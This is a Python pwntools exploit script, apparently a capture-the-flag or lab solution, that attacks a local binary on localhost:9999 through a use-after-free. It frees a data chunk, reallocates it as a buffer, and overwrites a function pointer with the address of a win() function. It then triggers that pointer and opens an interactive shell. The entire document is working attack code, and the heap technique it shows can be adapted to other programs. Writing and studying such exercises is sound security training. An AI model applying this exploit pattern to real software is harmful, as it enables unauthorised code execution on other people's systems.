from pwn import *

# Set up the target
context.binary = './src/vuln'
context.log_level = 'debug'

def main():
    # Start process
    p = remote('localhost', 9999)
    
    # Get win() function address from binary
    elf = ELF('./src/vuln')
    win_addr = elf.symbols['win']
    log.info(f"Win function address: {hex(win_addr)}")

    # 1. Allocate Data
    p.sendlineafter(b'> ', b'1')

    # 2. Free Data (create dangling pointer)
    p.sendlineafter(b'> ', b'3')

    # 3. Allocate Buffer (occupies freed Data chunk)
    p.sendlineafter(b'> ', b'2')
    
    # Craft payload: 32-byte buffer + win() address
    payload = b'A' * 32          # Fill buffer
    payload += p64(win_addr)     # Overwrite function pointer

    # Send payload to fill the buffer allocation
    p.sendafter(b'Enter buffer contents: ', payload)

    # 4. Trigger Use-After-Free to call overwritten function pointer
    p.sendlineafter(b'> ', b'4')

    # Get interactive shell/flag
    p.interactive()

if __name__ == '__main__':
    main()